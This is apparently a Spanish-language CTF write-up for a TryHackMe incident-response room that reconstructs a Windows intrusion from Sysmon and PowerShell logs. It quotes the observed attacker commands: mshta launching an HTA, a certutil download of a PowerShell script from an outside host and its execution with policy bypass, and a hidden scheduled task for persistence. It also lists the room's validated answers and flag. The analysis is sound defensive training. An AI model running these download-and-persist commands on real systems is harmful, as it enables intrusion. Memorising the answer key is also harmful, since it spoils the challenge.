# Handbook For The Recently Compromised

## Estado

- **Tipo:** CTF / Team room.
- **Dificultad:** Easy.
- **Duración estimada:** 30 minutos.
- **Resultado:** sala completada correctamente.
- **Fecha de trabajo:** 24 de octubre de 2026.
- **Leaderboard del evento:** `Challenges: 1/5`; el equipo `hackuaz` quedó con
  `SOC Simulator: Passed`, `TH Simulator: Passed`, `Tabletop: Completed` y
  **1548 XP**.
- **Recompensa individual:** 1 Tombstone Raffle Ticket.

> El writeup conserva los IOCs y las respuestas validadas, pero no incorpora
> los archivos EVTX ni otros artefactos temporales de la máquina.

## Objetivo

La sala pide reconstruir una intrusión a partir de dos registros de eventos de
Windows:

- `Microsoft-Windows-Sysmon%4Operational.evtx`;
- `PowerShell-Operational.evtx`.

La investigación debía identificar la primera ejecución sospechosa, seguir la
descarga del segundo stage, reconocer la técnica MITRE ATT&CK utilizada por el
adjunto y determinar el mecanismo de persistencia.

## Línea temporal y evidencia

### Acceso inicial: HTA y Mshta

El usuario `THM-JCOLLINS\j.collins` abrió el adjunto
`pipeline-check.hta` desde Downloads. Sysmon registró la ejecución mediante:

```text
C:\Windows\SysWOW64\mshta.exe C:\Users\j.collins\Downloads\pipeline-check.hta
```

Esto corresponde a **T1218.005 — Signed Binary Proxy Execution: Mshta**.
`mshta.exe` es un binario legítimo utilizado como proxy para ejecutar el
contenido HTA controlado por el atacante.

### Descarga del segundo stage

La siguiente cadena de proceso invocó `certutil.exe` mediante un comodín para
ocultar el nombre completo del binario y usó `-urlcache -f` para descargar el
script:

```text
certutil.exe -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 %TEMP%\pipeline-sync.ps1
powershell -ep bypass -f %TEMP%\pipeline-sync.ps1
```

El nombre completo de la utilidad es `certutil.exe` y la URL observada fue:

```text
http://pipeline-cdn.thm:8088/pipeline-sync.ps1
```

El script quedó asociado al usuario `j.collins` y a la ruta temporal de
`pipeline-sync.ps1`.

### Persistencia

El script creó una tarea programada llamada `StudioPipelineSync`:

```text
schtasks.exe /create /tn StudioPipelineSync /tr "powershell -nop -w hidden -f C:\Users\j.collins\AppData\Roaming\PipelineSync\pipeline-sync.ps1" /sc onlogon /rl highest /f
```

La técnica es **T1053.005 — Scheduled Task/Job: Scheduled Task**. La tarea se
ejecutaba al iniciar sesión, con PowerShell oculto y privilegios elevados.

### Artefacto final

El bloque de PowerShell almacenó una flag decodificada desde Base64 bajo un
directorio temporal de `PipelineSync`. La conversión del blob con `base64 -d`
produjo la respuesta final de la sala.

## Respuestas validadas

| Pregunta | Respuesta |
|---|---|
| Utilidad Windows completa | `certutil.exe` |
| URL del segundo stage | `http://pipeline-cdn.thm:8088/pipeline-sync.ps1` |
| Subtécnica del adjunto HTA | `T1218.005` |
| Subtécnica de persistencia | `T1053.005` |
| Flag | `THM{tH3_Gh0st_w1th_Th3_M05T}` |

## Método de análisis

La máquina entregó un AttackBox y un directorio `Desktop/artifacts`. Para
convertir los EVTX se utilizó el parser `evtx_dump` incluido en
`Desktop/artifacts/tools`:

```bash
cd ~/Desktop/artifacts
tools/evtx_dump *Sysmon* > /tmp/s.xml
tools/evtx_dump *PowerShell* > /tmp/p.xml
```

Consultas útiles para reproducir la correlación:

```bash
grep -oE 'https?://[^<"]+' /tmp/s.xml | sort -u
grep -i -A3 -B3 'pipeline-sync' /tmp/s.xml
grep -iE 'vbs|cscript|jscript|mshta|wscript' /tmp/s.xml
grep -i -A14 -B14 'FromBase64String' /tmp/p.xml
```

El uso de `FromBase64String` permitió confirmar que la flag estaba embebida en
el bloque de PowerShell y evitar confundirla con el contenido operativo del
script.

## Validación en TryHackMe

Las cinco preguntas fueron aceptadas. La sala redirigió a la pantalla
`Room completed` y el progreso del evento se sincronizó como `Challenges: 1/5`.
El leaderboard mostró **1548 XP** para `hackuaz`.
